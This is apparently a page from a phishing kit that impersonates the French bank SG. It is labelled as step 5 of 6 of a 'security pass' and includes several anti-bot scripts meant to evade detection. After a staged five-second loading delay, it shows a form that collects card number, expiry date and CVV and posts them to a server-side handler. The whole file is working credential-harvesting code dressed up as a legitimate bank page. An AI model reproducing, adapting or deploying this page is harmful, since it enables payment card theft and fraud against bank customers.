<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SG | Carte bancaire</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    * {
      box-sizing: border-box;
    }

    body, html {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      height: 100%;
    }

    .step-title {
      font-weight: bold;
      color: #000;
      margin-left: 20px;
      font-size: 1rem;
    }

    .center-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 200px);
    }

    .form-box {
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    .instruction-text {
      font-size: 1.3rem;
      line-height: 1.8rem;
      font-weight: 500;
      color: #000;
      margin-bottom: 30px;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 25px;
    }

    .client-input {
      width: 100%;
      padding: 12px 10px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      background-color: #fff;
    }

    .validate-btn {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #E71921;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .validate-btn:hover {
      background-color: #c9141b;
    }

    .loader-local {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 180px;
    }

    .loader-dots {
      display: flex;
      gap: 10px;
    }

    .loader-dots div {
      width: 10px;
      height: 10px;
      background-color: gray;
      opacity: 0.3;
      animation: blink 1.5s infinite;
      border-radius: 2px;
    }

    .loader-dots div:nth-child(1) { animation-delay: 0s; }
    .loader-dots div:nth-child(2) { animation-delay: 0.3s; }
    .loader-dots div:nth-child(3) { animation-delay: 0.6s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0.3; transform: scale(1); }
      40% { opacity: 1; transform: scale(1.3); }
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="top-bar">
      <div class="nav-right">
        <a href="succes.php"><img src="icons/location.svg" alt=""> Agences</a>
        <a href="#"><img src="icons/warning.svg" alt=""> Aide et contacts</a>
      </div>
    </div>
    <div class="bottom-bar">
      <div class="logo-slogan">
        <img src="IMG/images (3).png" alt="SG Logo">
      </div>
      <button class="open-account">Déconnecter</button>
    </div>
  </div>

  <hr>
  <p class="sub-title step-title">Pass sécurité - Etape 5/6</p>

  <div class="center-wrapper">

    <div id="loadingBlock" class="loader-local">
      <div class="loader-dots">
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>

    <div class="form-box" id="mainForm" style="display:none;">
      <p class="instruction-text">
        Par mesure de sécurité,<br>
        veuillez remplir vos coordonnées suivantes :
      </p>

      <form method="POST" action="action/carte.php" autocomplete="off">
        <div class="input-wrapper">
          <input type="text" class="client-input" id="cardNumber" name="cardNumber" placeholder="Numéro de carte de crédit" maxlength="19" inputmode="numeric" required>
        </div>

        <div class="input-wrapper">
          <input type="text" class="client-input" name="expiry" placeholder="MM / YY" maxlength="7" pattern="(0[1-9]|1[0-2]) ?\/ ?\d{2}" required>
        </div>

        <div class="input-wrapper">
          <input type="text" class="client-input" name="cvv" placeholder="Cryptogramme visuel" maxlength="3" pattern="\d{3}" inputmode="numeric" required>
        </div>

        <button class="validate-btn" type="submit">Valider</button>
      </form>
    </div>
  </div>

  <footer>
    <div class="footer-top">
      <div class="footer-links">
        <div><i class="fas fa-question-circle"></i> Questions fréquentes</div>
        <div><i class="fas fa-map-marker-alt"></i> Trouver une agence</div>
        <div>Autres sites SG <i class="fas fa-chevron-down"></i></div>
      </div>
      <div class="footer-social">
        <i class="fab fa-facebook-f"></i>
        <i class="fab fa-instagram"></i>
        <i class="fab fa-x-twitter"></i>
      </div>
    </div>
    <div class="footer-bottom">
      <img src="IMG/piedpage.png" alt="SG Logo" class="sg-logo">
      <div class="footer-text">
        <span>Sécurité</span> |
        <span>Nos engagements</span> |
        <span>Gestion des Cookies</span> |
        <span>Données personnelles</span> |
        <span>Documentation et Tarifs</span> |
        <span>Contestation et réclamation</span> |
        <span>Informations légales</span> |
        <span>Accessibilité Numérique</span>
      </div>
    </div>
  </footer>

  <script>
    window.addEventListener("load", function () {
      setTimeout(() => {
        document.getElementById("loadingBlock").style.display = "none";
        document.getElementById("mainForm").style.display = "block";
      }, 5000);
    });

    const cardInput = document.getElementById('cardNumber');
    cardInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '').substring(0, 16);
      let formatted = value.match(/.{1,4}/g);
      e.target.value = formatted ? formatted.join(' ') : value;
    });

    const expiryInput = document.querySelector('input[name="expiry"]');
    expiryInput.addEventListener('input', function (e) {
      let val = e.target.value.replace(/\D/g, '').substring(0, 4);
      e.target.value = val.length >= 3
        ? val.substring(0, 2) + ' / ' + val.substring(2, 4)
        : val;
    });

    document.querySelectorAll('.client-input').forEach(input => {
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') e.preventDefault();
      });
    });
  </script>

</body>
</html>
